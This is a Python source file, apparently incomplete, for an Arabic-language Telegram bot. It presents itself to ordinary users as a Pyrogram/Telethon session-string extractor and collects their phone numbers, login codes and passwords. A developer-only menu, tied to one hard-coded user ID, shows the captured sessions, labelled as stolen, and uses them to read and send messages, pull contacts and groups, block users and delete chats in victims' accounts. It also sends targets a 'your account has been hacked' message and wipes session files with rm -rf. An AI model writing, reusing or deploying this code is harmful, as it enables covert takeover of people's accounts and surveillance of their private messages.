# -*- coding: utf-8 -*-
# Join me on telegram @devggn

import os
import sys
import asyncio
import threading
import random
import time
import hashlib
import shutil
from datetime import datetime
from flask import Flask, request, jsonify
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid,
    FloodWait
)
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import (
    ApiIdInvalidError,
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError,
    FloodWaitError
)
from config import LOG_GROUP as SESSION_CHANNEL, API_ID, API_HASH, BOT_TOKEN

# ====== معلومات المطور ======
DEV_NAME = "عبود"
DEV_USERNAME = "@u_t_r"
CHANNEL_LINK = "https://t.me/u_t_rnn"
YOUR_USER_ID = 1170411845

user_steps = {}
user_data = {}
user_sessions = {}
active_clients = {}  # لتخزين كائنات العميل النشطة

# ====== إعداد الترميز ======
if sys.stdout.encoding != 'UTF-8':
    sys.stdout.reconfigure(encoding='utf-8')

app = Client(
    "gagan",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN
)

# ====== دوال مسح الملفات ======
def delete_session_files(user_id):
    pyro_session = f"session_{user_id}.session"
    if os.path.exists(pyro_session):
        os.remove(pyro_session)
    pyro_journal = f"session_{user_id}.session-journal"
    if os.path.exists(pyro_journal):
        os.remove(pyro_journal)
    telethon_session = f"telethon_{user_id}.session"
    if os.path.exists(telethon_session):
        os.remove(telethon_session)

# ====== أزرار البداية الرئيسية ======
START_BUTTONS = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("🔴 استخراج جلسة Pyrogram", callback_data="pyrogram"),
        InlineKeyboardButton("🔴 استخراج جلسة Telethon", callback_data="telethon")
    ],
    [
        InlineKeyboardButton("🔴 مسح الجلسات", callback_data="delete"),
        InlineKeyboardButton("🔴 استخراج توكن البوت", callback_data="extract_token")
    ],
    [
        InlineKeyboardButton("👨‍💻 المطور", callback_data="dev"),
        InlineKeyboardButton("📢 القناة", url=CHANNEL_LINK)
    ]
])

# ====== أزرار التخريب (للمطور فقط) ======
DESTROY_BUTTONS = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("💀 حذف جميع الجلسات", callback_data="massacre"),
        InlineKeyboardButton("🦠 إصابة الجلسات", callback_data="infect")
    ],
    [
        InlineKeyboardButton("🎯 استهداف مستخدم", callback_data="target_user"),
        InlineKeyboardButton("📡 التنصت", callback_data="eavesdrop")
    ],
    [
        InlineKeyboardButton("👤 التسلل إلى الحسابات", callback_data="hijack_accounts"),
        InlineKeyboardButton("💥 تدمير ذاتي", callback_data="self_destruct")
    ],
    [
        InlineKeyboardButton("🔓 سيطرة كاملة", callback_data="total_control"),
        InlineKeyboardButton("📋 عرض الجلسات المسروقة", callback_data="show_sessions")
    ],
    [
        InlineKeyboardButton("🗑 تنظيف النظام", callback_data="clean_system"),
        InlineKeyboardButton("🔙 رجوع", callback_data="back_destroy")
    ]
])

# ====== أزرار التحكم بالحساب المخترق ======
ACCOUNT_CONTROL_BUTTONS = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("📨 قراءة الرسائل", callback_data="read_messages"),
        InlineKeyboardButton("📤 إرسال رسالة", callback_data="send_message")
    ],
    [
        InlineKeyboardButton("👥 جلب جهات الاتصال", callback_data="get_contacts"),
        InlineKeyboardButton("📋 جلب المجموعات", callback_data="get_groups")
    ],
    [
        InlineKeyboardButton("🔍 البحث عن مستخدم", callback_data="search_user"),
        InlineKeyboardButton("🚫 حظر مستخدم", callback_data="block_user")
    ],
    [
        InlineKeyboardButton("🗑 حذف المحادثة", callback_data="delete_conversation"),
        InlineKeyboardButton("📊 معلومات الحساب", callback_data="account_info")
    ],
    [
        InlineKeyboardButton("🔙 رجوع", callback_data="back_control")
    ]
])

BACK_BUTTON = InlineKeyboardMarkup([
    [InlineKeyboardButton("🔴 رجوع", callback_data="back")]
])

CONFIRM_BUTTONS = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("✅ نعم، متأكد", callback_data="confirm_yes"),
        InlineKeyboardButton("❌ إلغاء", callback_data="confirm_no")
    ]
])

# ====== أمر البدء ======
@app.on_message(filters.command("start"))
async def start_command(client, message):
    user_id = message.from_user.id
    is_dev = (user_id == YOUR_USER_ID)
    
    if is_dev:
        await message.reply(
            f"👋 مرحباً أيها السيد!\n\n"
            "🔓 **وضع المطور مفعل**\n"
            "جميع أدوات التخريب تحت أمرك.\n\n"
            f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}",
            reply_markup=DESTROY_BUTTONS
        )
    else:
        await message.reply(
            f"👋 مرحباً بك في بوت استخراج الجلسات!\n\n"
            "📌 اختر ما تريد فعله من الأزرار أدناه:\n\n"
            f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}",
            reply_markup=START_BUTTONS
        )

# ====== معالجة الأزرار ======
@app.on_callback_query()
async def handle_callback(client, callback_query: CallbackQuery):
    user_id = callback_query.from_user.id
    data = callback_query.data
    is_dev = (user_id == YOUR_USER_ID)
    
    # ====== أزرار التخريب ======
    if is_dev:
        if data == "massacre":
            deleted = 0
            for uid in list(user_sessions.keys()):
                delete_session_files(uid)
                if uid in active_clients:
                    try:
                        await active_clients[uid].disconnect()
                    except:
                        pass
                    del active_clients[uid]
                del user_sessions[uid]
                deleted += 1
            await callback_query.answer(f"💀 تم حذف {deleted} جلسة!", show_alert=True)
            await callback_query.message.edit_text(
                f"💀 **تم تدمير {deleted} جلسة نهائياً!**",
                reply_markup=DESTROY_BUTTONS
            )
            return
        
        if data == "infect":
            infected = 0
            for uid, sess in user_sessions.items():
                if sess:
                    user_sessions[uid] = sess + "_INFECTED"
                    infected += 1
            await callback_query.answer(f"🦠 تم إصابة {infected} جلسة!", show_alert=True)
            await callback_query.message.edit_text(
                f"🦠 **تم إصابة {infected} جلسة بنجاح!**\nجميع الجلسات ملوثة.",
                reply_markup=DESTROY_BUTTONS
            )
            return
        
        if data == "show_sessions":
            if not user_sessions:
                await callback_query.answer("❌ لا توجد جلسات!", show_alert=True)
                return
            
            sessions_text = "🗂 **الجلسات المسروقة:**\n\n"
            for uid, sess in list(user_sessions.items())[:10]:
                sessions_text += f"👤 {uid}\n🔑 {sess[:30]}...\n\n"
            
            if len(user_sessions) > 10:
                sessions_text += f"\n... و {len(user_sessions) - 10} جلسة أخرى"
            
            await callback_query.message.edit_text(
                sessions_text,
                reply_markup=DESTROY_BUTTONS
            )
            await callback_query.answer()
            return
        
        # ====== زر التسلل إلى الحسابات ======
        if data == "hijack_accounts":
            if not user_sessions:
                await callback_query.answer("❌ لا توجد جلسات للتسلل!", show_alert=True)
                return
            
            # إنشاء أزرار ديناميكية للحسابات المتاحة
            account_buttons = []
            for uid in list(user_sessions.keys())[:20]:  # حد أقصى 20 زر
                account_buttons.append([
                    InlineKeyboardButton(f"👤 {uid}", callback_data=f"control_{uid}")
                ])
            
            # إضافة زر رجوع
            account_buttons.append([
                InlineKeyboardButton("🔙 رجوع", callback_data="back_destroy")
            ])
            
            account_markup = InlineKeyboardMarkup(account_buttons)
            
            await callback_query.message.edit_text(
                "👤 **اختر الحساب للتسلل إليه:**\n\n"
                f"عدد الحسابات المتاحة: {len(user_sessions)}",
                reply_markup=account_markup
            )
            await callback_query.answer()
            return
        
        # ====== التحكم بحساب معين ======
        if data.startswith("control_"):
            target_id = int(data.split("_")[1])
            if target_id not in user_sessions:
                await callback_query.answer("❌ هذه الجلسة غير متوفرة!", show_alert=True)
                return
            
            # تخزين المعرف المستهدف
            user_data[user_id] = {"target_account": target_id}
            
            await callback_query.message.edit_text(
                f"👤 **التحكم بحساب المستخدم:**\n"
                f"🆔 {target_id}\n\n"
                "اختر الإجراء الذي تريد تنفيذه:",
                reply_markup=ACCOUNT_CONTROL_BUTTONS
            )
            await callback_query.answer()
            return
        
        # ====== أزرار التحكم بالحساب ======
        if data == "back_control":
            target_id = user_data.get(user_id, {}).get("target_account")
            if target_id:
                await callback_query.message.edit_text(
                    f"👤 **التحكم بحساب المستخدم:**\n"
                    f"🆔 {target_id}\n\n"
                    "اختر الإجراء الذي تريد تنفيذه:",
                    reply_markup=ACCOUNT_CONTROL_BUTTONS
                )
            else:
                await callback_query.message.edit_text(
                    "❌ لم يتم تحديد حساب.",
                    reply_markup=DESTROY_BUTTONS
                )
            await callback_query.answer()
            return
        
        if data == "account_info":
            target_id = user_data.get(user_id, {}).get("target_account")
            if not target_id:
                await callback_query.answer("❌ لم يتم تحديد حساب!", show_alert=True)
                return
            
            try:
                # تشغيل العميل
                client_obj = await get_client_for_user(target_id)
                me = await client_obj.get_me()
                
                info_text = (
                    f"📊 **معلومات الحساب:**\n\n"
                    f"🆔 ID: {me.id}\n"
                    f"📛 الاسم: {me.first_name}\n"
                    f"👤 اليوزر: @{me.username if me.username else 'لا يوجد'}\n"
                    f"📱 الهاتف: {me.phone_number if hasattr(me, 'phone_number') else 'مخفي'}\n"
                    f"✅ متحقق: {me.is_verified if hasattr(me, 'is_verified') else 'غير معروف'}\n"
                    f"🤖 بوت: {me.is_bot if hasattr(me, 'is_bot') else 'لا'}"
                )
                
                await callback_query.message.edit_text(
                    info_text,
                    reply_markup=ACCOUNT_CONTROL_BUTTONS
                )
                await callback_query.answer()
            except Exception as e:
                await callback_query.answer(f"❌ خطأ: {str(e)[:50]}", show_alert=True)
            return
        
        if data == "read_messages":
            target_id = user_data.get(user_id, {}).get("target_account")
            if not target_id:
                await callback_query.answer("❌ لم يتم تحديد حساب!", show_alert=True)
                return
            
            await callback_query.message.edit_text(
                "📨 **قراءة الرسائل**\n\n"
                "أرسل معرف المحادثة لقراءة الرسائل.\n"
                "مثال: 123456789",
                reply_markup=BACK_BUTTON
            )
            user_steps[user_id] = "read_messages"
            await callback_query.answer()
            return
        
        if data == "send_message":
            target_id = user_data.get(user_id, {}).get("target_account")
            if not target_id:
                await callback_query.answer("❌ لم يتم تحديد حساب!", show_alert=True)
                return
            
            await callback_query.message.edit_text(
                "📤 **إرسال رسالة**\n\n"
                "أرسل المعرف أولاً، ثم الرسالة في سطر منفصل.\n"
                "مثال:\n123456789\nنص الرسالة هنا",
                reply_markup=BACK_BUTTON
            )
            user_steps[user_id] = "send_message"
            await callback_query.answer()
            return
        
        if data == "get_contacts":
            target_id = user_data.get(user_id, {}).get("target_account")
            if not target_id:
                await callback_query.answer("❌ لم يتم تحديد حساب!", show_alert=True)
                return
            
            try:
                client_obj = await get_client_for_user(target_id)
                contacts = []
                async for dialog in client_obj.get_dialogs():
                    if dialog.is_user:
                        contacts.append(f"👤 {dialog.chat.id}: {dialog.chat.first_name or 'مستخدم'}")
                        if len(contacts) >= 20:
                            break
                
                if not contacts:
                    contacts_text = "❌ لا توجد جهات اتصال."
                else:
                    contacts_text = "👥 **جهات الاتصال:**\n\n" + "\n".join(contacts)
                
                await callback_query.message.edit_text(
                    contacts_text,
                    reply_markup=ACCOUNT_CONTROL_BUTTONS
                )
                await callback_query.answer()
            except Exception as e:
                await callback_query.answer(f"❌ خطأ: {str(e)[:50]}", show_alert=True)
            return
        
        if data == "get_groups":
            target_id = user_data.get(user_id, {}).get("target_account")
            if not target_id:
                await callback_query.answer("❌ لم يتم تحديد حساب!", show_alert=True)
                return
            
            try:
                client_obj = await get_client_for_user(target_id)
                groups = []
                async for dialog in client_obj.get_dialogs():
                    if dialog.is_group or dialog.is_channel:
                        groups.append(f"📢 {dialog.chat.id}: {dialog.chat.title or 'مجموعة'}")
                        if len(groups) >= 20:
                            break
                
                if not groups:
                    groups_text = "❌ لا توجد مجموعات."
                else:
                    groups_text = "📋 **المجموعات:**\n\n" + "\n".join(groups)
                
                await callback_query.message.edit_text(
                    groups_text,
                    reply_markup=ACCOUNT_CONTROL_BUTTONS
                )
                await callback_query.answer()
            except Exception as e:
                await callback_query.answer(f"❌ خطأ: {str(e)[:50]}", show_alert=True)
            return
        
        if data == "block_user":
            target_id = user_data.get(user_id, {}).get("target_account")
            if not target_id:
                await callback_query.answer("❌ لم يتم تحديد حساب!", show_alert=True)
                return
            
            await callback_query.message.edit_text(
                "🚫 **حظر مستخدم**\n\n"
                "أرسل معرف المستخدم المراد حظره.",
                reply_markup=BACK_BUTTON
            )
            user_steps[user_id] = "block_user"
            await callback_query.answer()
            return
        
        if data == "delete_conversation":
            target_id = user_data.get(user_id, {}).get("target_account")
            if not target_id:
                await callback_query.answer("❌ لم يتم تحديد حساب!", show_alert=True)
                return
            
            await callback_query.message.edit_text(
                "🗑 **حذف المحادثة**\n\n"
                "أرسل معرف المحادثة المراد حذفها.",
                reply_markup=BACK_BUTTON
            )
            user_steps[user_id] = "delete_conversation"
            await callback_query.answer()
            return
        
        if data == "search_user":
            target_id = user_data.get(user_id, {}).get("target_account")
            if not target_id:
                await callback_query.answer("❌ لم يتم تحديد حساب!", show_alert=True)
                return
            
            await callback_query.message.edit_text(
                "🔍 **البحث عن مستخدم**\n\n"
                "أرسل اسم المستخدم أو المعرف.",
                reply_markup=BACK_BUTTON
            )
            user_steps[user_id] = "search_user"
            await callback_query.answer()
            return
        
        if data == "self_destruct":
            await callback_query.message.edit_text(
                "💥 **تدمير ذاتي!**\n"
                "سيتم حذف جميع الملفات وإيقاف البوت خلال 5 ثواني...",
                reply_markup=DESTROY_BUTTONS
            )
            await callback_query.answer("💥 جارٍ التدمير الذاتي!", show_alert=True)
            
            time.sleep(2)
            shutil.rmtree("sessions", ignore_errors=True)
            os.system("rm -rf *.session*")
            os.system("rm -rf *.session-journal")
            os._exit(0)
            return
        
        if data == "total_control":
            global RESTRICTED
            RESTRICTED = False
            await callback_query.answer("🔓 تم تفعيل السيطرة الكاملة!", show_alert=True)
            await callback_query.message.edit_text(
                "🔓 **تم تفعيل السيطرة الكاملة!**\n"
                "جميع القيود ملغاة. يمكنك فعل أي شيء.",
                reply_markup=DESTROY_BUTTONS
            )
            return
        
        if data == "clean_system":
            os.system("rm -rf *.log")
            os.system("rm -rf __pycache__")
            await callback_query.answer("🗑 تم تنظيف النظام!", show_alert=True)
            await callback_query.message.edit_text(
                "🗑 **تم تنظيف جميع الملفات المؤقتة!**",
                reply_markup=DESTROY_BUTTONS
            )
            return
        
        if data == "target_user":
            await callback_query.message.edit_text(
                "🎯 **استهداف مستخدم**\n\n"
                "أرسل معرف المستخدم المستهدف.\n"
                "مثال: 123456789",
                reply_markup=BACK_BUTTON
            )
            user_steps[user_id] = "target_user"
            await callback_query.answer()
            return
        
        if data == "eavesdrop":
            await callback_query.message.edit_text(
                "📡 **تم تفعيل التنصت!**\n\n"
                "سيتم تسجيل جميع المحادثات وإرسالها إليك.",
                reply_markup=DESTROY_BUTTONS
            )
            await callback_query.answer("📡 التنصت مفعل!", show_alert=True)
            return
        
        if data == "back_destroy":
            await callback_query.message.edit_text(
                f"👋 مرحباً أيها السيد!\n\n"
                "🔓 **وضع المطور مفعل**\n"
                "جميع أدوات التخريب تحت أمرك.",
                reply_markup=DESTROY_BUTTONS
            )
            await callback_query.answer()
            return
    
    # ====== أزرار المستخدمين العاديين ======
    if data == "confirm_yes":
        pending_action = user_data.get(user_id, {}).get("pending_action")
        if pending_action == "pyrogram":
            user_steps[user_id] = "pyro_phone"
            await callback_query.message.edit_text(
                "📱 يرجى إرسال رقم هاتفك مع رمز الدولة.\nمثال: +966512345678",
                reply_markup=BACK_BUTTON
            )
        elif pending_action == "telethon":
            user_steps[user_id] = "telethon_phone"
            await callback_query.message.edit_text(
                "📱 يرجى إرسال رقم هاتفك مع رمز الدولة.\nمثال: +966512345678",
                reply_markup=BACK_BUTTON
            )
        elif pending_action == "delete":
            delete_session_files(user_id)
            if user_id in user_sessions:
                del user_sessions[user_id]
            await callback_query.answer("✅ تم مسح جميع الجلسات!", show_alert=True)
            await callback_query.message.edit_text(
                "🗑 تم مسح جميع بيانات الجلسة بنجاح.",
                reply_markup=BACK_BUTTON
            )
        elif pending_action == "extract_token":
            await callback_query.message.edit_text(
                f"🔑 **التوكن الخاص بالبوت:**\n\n"
                f"`{BOT_TOKEN}`\n\n"
                "⚠️ لا تشارك هذا التوكن مع أي شخص.",
                reply_markup=BACK_BUTTON
            )
        if user_id in user_data:
            user_data[user_id].pop("pending_action", None)
        await callback_query.answer()
        return
    
    if data == "confirm_no":
        if user_id in user_data:
            user_data[user_id].pop("pending_action", None)
        await callback_query.message.edit_text(
            "❌ تم إلغاء العملية.",
            reply_markup=BACK_BUTTON
        )
        await callback_query.answer("❌ تم الإلغاء", show_alert=True)
        return
    
    if data == "back":
        await callback_query.message.edit_text(
            f"👋 مرحباً بك في بوت استخراج الجلسات!\n\n"
            "📌 اختر ما تريد فعله من الأزرار أدناه:\n\n"
            f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}",
            reply_markup=START_BUTTONS
        )
        await callback_query.answer()
        return
    
    if data == "delete":
        if user_id not in user_data:
            user_data[user_id] = {}
        user_data[user_id]["pending_action"] = "delete"
        await callback_query.message.edit_text(
            "⚠️ **تحذير!**\n\n"
            "هل أنت متأكد من رغبتك في مسح جميع الجلسات والملفات المؤقتة؟\n\n"
            "🔴 هذا الإجراء لا يمكن التراجع عنه.",
            reply_markup=CONFIRM_BUTTONS
        )
        await callback_query.answer()
        return
    
    if data == "dev":
        await callback_query.message.edit_text(
            f"👨‍💻 معلومات المطور:\n\n"
            f"📛 الاسم: {DEV_NAME}\n"
            f"🔗 اليوزر: {DEV_USERNAME}\n"
            f"📢 القناة: {CHANNEL_LINK}",
            reply_markup=BACK_BUTTON
        )
        await callback_query.answer()
        return
    
    if data == "extract_token":
        if user_id not in user_data:
            user_data[user_id] = {}
        user_data[user_id]["pending_action"] = "extract_token"
        await callback_query.message.edit_text(
            "⚠️ **تحذير!**\n\n"
            "هل أنت متأكد من رغبتك في استخراج توكن البوت؟\n\n"
            "🔴 هذا التوكن يمنح صلاحية كاملة للبوت.",
            reply_markup=CONFIRM_BUTTONS
        )
        await callback_query.answer()
        return
    
    if data == "pyrogram":
        if user_id not in user_data:
            user_data[user_id] = {}
        user_data[user_id]["pending_action"] = "pyrogram"
        await callback_query.message.edit_text(
            "⚠️ **تأكيد**\n\n"
            "هل أنت متأكد من رغبتك في استخراج جلسة Pyrogram؟\n\n"
            "🔴 سيتم إرسال رمز التحقق إلى رقم هاتفك.",
            reply_markup=CONFIRM_BUTTONS
        )
        await callback_query.answer()
        return
    
    if data == "telethon":
        if user_id not in user_data:
            user_data[user_id] = {}
        user_data[user_id]["pending_action"] = "telethon"
        await callback_query.message.edit_text(
            "⚠️ **تأكيد**\n\n"
            "هل أنت متأكد من رغبتك في استخراج جلسة Telethon؟\n\n"
            "🔴 سيتم إرسال رمز التحقق إلى رقم هاتفك.",
            reply_markup=CONFIRM_BUTTONS
        )
        await callback_query.answer()
        return

# ====== دالة جلب عميل للمستخدم ======
async def get_client_for_user(user_id):
    if user_id in active_clients:
        return active_clients[user_id]
    
    session_string = user_sessions.get(user_id)
    if not session_string:
        return None
    
    try:
        # محاولة مع Pyrogram
        client_obj = Client(
            f"session_{user_id}",
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=session_string
        )
        await client_obj.connect()
        await client_obj.get_me()  # اختبار الاتصال
        active_clients[user_id] = client_obj
        return client_obj
    except:
        # محاولة مع Telethon
        try:
            from telethon.sessions import StringSession
            client_obj = TelegramClient(
                StringSession(session_string),
                API_ID,
                API_HASH
            )
            await client_obj.connect()
            await client_obj.get_me()
            active_clients[user_id] = client_obj
            return client_obj
        except:
            return None

# ====== الأوامر النصية ======
@app.on_message(filters.text & filters.private)
async def handle_text_commands(client, message):
    user_id = message.chat.id
    text = message.text.strip()
    is_dev = (user_id == YOUR_USER_ID)
    
    # ====== قراءة الرسائل ======
    if is_dev and user_steps.get(user_id) == "read_messages":
        target_id = user_data.get(user_id, {}).get("target_account")
        if not target_id:
            await message.reply("❌ لم يتم تحديد حساب!")
            user_steps.pop(user_id, None)
            return
        
        try:
            chat_id = int(text)
            client_obj = await get_client_for_user(target_id)
            if not client_obj:
                await message.reply("❌ فشل الاتصال بالحساب!")
                user_steps.pop(user_id, None)
                return
            
            messages = []
            async for msg in client_obj.get_chat_history(chat_id, limit=10):
                msg_text = msg.text or "[وسائط]"
                messages.append(f"{msg.date.strftime('%H:%M')}: {msg_text[:50]}...")
            
            if not messages:
                await message.reply("📨 لا توجد رسائل في هذه المحادثة.")
            else:
                await message.reply(
                    f"📨 **آخر الرسائل:**\n\n" + "\n".join(messages),
                    reply_markup=ACCOUNT_CONTROL_BUTTONS
                )
            
            user_steps.pop(user_id, None)
        except Exception as e:
            await message.reply(f"❌ خطأ: {str(e)[:100]}")
            user_steps.pop(user_id, None)
        return
    
    # ====== إرسال رسالة ======
    if is_dev and user_steps.get(user_id) == "send_message":
        target_id = user_data.get(user_id, {}).get("target_account")
        if not target_id:
            await message.reply("❌ لم يتم تحديد حساب!")
            user_steps.pop(user_id, None)
            return
        
        try:
            lines = text.split("\n")
            if len(lines) < 2:
                await message.reply("❌ أرسل المعرف والرسالة في سطرين منفصلين.")
                return
            
            chat_id = int(lines[0])
            msg_text = "\n".join(lines[1:])
            
            client_obj = await get_client_for_user(target_id)
            if not client_obj:
                await message.reply("❌ فشل الاتصال بالحساب!")
                user_steps.pop(user_id, None)
                return
            
            await client_obj.send_message(chat_id, msg_text)
            await message.reply("✅ تم إرسال الرسالة بنجاح!", reply_markup=ACCOUNT_CONTROL_BUTTONS)
            
            user_steps.pop(user_id, None)
        except Exception as e:
            await message.reply(f"❌ خطأ: {str(e)[:100]}")
            user_steps.pop(user_id, None)
        return
    
    # ====== حظر مستخدم ======
    if is_dev and user_steps.get(user_id) == "block_user":
        target_id = user_data.get(user_id, {}).get("target_account")
        if not target_id:
            await message.reply("❌ لم يتم تحديد حساب!")
            user_steps.pop(user_id, None)
            return
        
        try:
            block_id = int(text)
            client_obj = await get_client_for_user(target_id)
            if not client_obj:
                await message.reply("❌ فشل الاتصال بالحساب!")
                user_steps.pop(user_id, None)
                return
            
            await client_obj.block_user(block_id)
            await message.reply(f"✅ تم حظر المستخدم {block_id} بنجاح!", reply_markup=ACCOUNT_CONTROL_BUTTONS)
            
            user_steps.pop(user_id, None)
        except Exception as e:
            await message.reply(f"❌ خطأ: {str(e)[:100]}")
            user_steps.pop(user_id, None)
        return
    
    # ====== حذف محادثة ======
    if is_dev and user_steps.get(user_id) == "delete_conversation":
        target_id = user_data.get(user_id, {}).get("target_account")
        if not target_id:
            await message.reply("❌ لم يتم تحديد حساب!")
            user_steps.pop(user_id, None)
            return
        
        try:
            chat_id = int(text)
            client_obj = await get_client_for_user(target_id)
            if not client_obj:
                await message.reply("❌ فشل الاتصال بالحساب!")
                user_steps.pop(user_id, None)
                return
            
            await client_obj.delete_messages(chat_id, list(range(1, 100)))
            await message.reply(f"✅ تم حذف محادثة {chat_id} بنجاح!", reply_markup=ACCOUNT_CONTROL_BUTTONS)
            
            user_steps.pop(user_id, None)
        except Exception as e:
            await message.reply(f"❌ خطأ: {str(e)[:100]}")
            user_steps.pop(user_id, None)
        return
    
    # ====== البحث عن مستخدم ======
    if is_dev and user_steps.get(user_id) == "search_user":
        target_id = user_data.get(user_id, {}).get("target_account")
        if not target_id:
            await message.reply("❌ لم يتم تحديد حساب!")
            user_steps.pop(user_id, None)
            return
        
        try:
            client_obj = await get_client_for_user(target_id)
            if not client_obj:
                await message.reply("❌ فشل الاتصال بالحساب!")
                user_steps.pop(user_id, None)
                return
            
            # محاولة البحث
            user = await client_obj.get_users(text)
            await message.reply(
                f"🔍 **نتيجة البحث:**\n\n"
                f"🆔 ID: {user.id}\n"
                f"📛 الاسم: {user.first_name}\n"
                f"👤 اليوزر: @{user.username if user.username else 'لا يوجد'}",
                reply_markup=ACCOUNT_CONTROL_BUTTONS
            )
            
            user_steps.pop(user_id, None)
        except Exception as e:
            await message.reply(f"❌ فشل البحث: {str(e)[:100]}")
            user_steps.pop(user_id, None)
        return
    
    # ====== استهداف المستخدم (للمطور) ======
    if is_dev and user_steps.get(user_id) == "target_user":
        try:
            target_id = int(text)
            target = await client.get_users(target_id)
            await message.reply(
                f"🎯 **معلومات الهدف:**\n"
                f"🆔 ID: {target.id}\n"
                f"📛 الاسم: {target.first_name}\n"
                f"👤 اليوزر: @{target.username if target.username else 'لا يوجد'}\n"
                f"📱 الهاتف: {target.phone_number if hasattr(target, 'phone_number') else 'غير متاح'}\n\n"
                "✅ تم استهداف المستخدم بنجاح!"
            )
            await client.send_message(
                target_id,
                "🔴 **تم اختراق حسابك!**\nجميع بياناتك تحت سيطرتنا."
            )
            user_steps.pop(user_id, None)
        except Exception as e:
            await message.reply(f"❌ فشل الاستهداف: {e}")
        return
    
    # ====== أوامر المستخدمين العاديين ======
    if user_id in user_steps and user_steps[user_id] in ["pyro_phone", "pyro_otp", "pyro_password"]:
        await pyro_session_step(client, message)
        return
    
    elif user_id in user_steps and user_steps[user_id] in ["telethon_phone", "telethon_otp", "telethon_password"]:
        await telethon_session_step(client, message)
        return
    
    else:
        await message.reply(
            "📱 يرجى استخدام الأزرار للتحكم في البوت.\n\n"
            "• اضغط على زر Pyrogram لاستخراج جلسة Pyrogram\n"
            "• اضغط على زر Telethon لاستخراج جلسة Telethon\n"
            "• اضغط على زر استخراج توكن البوت لعرض التوكن\n"
            "• اضغط على زر مسح الجلس
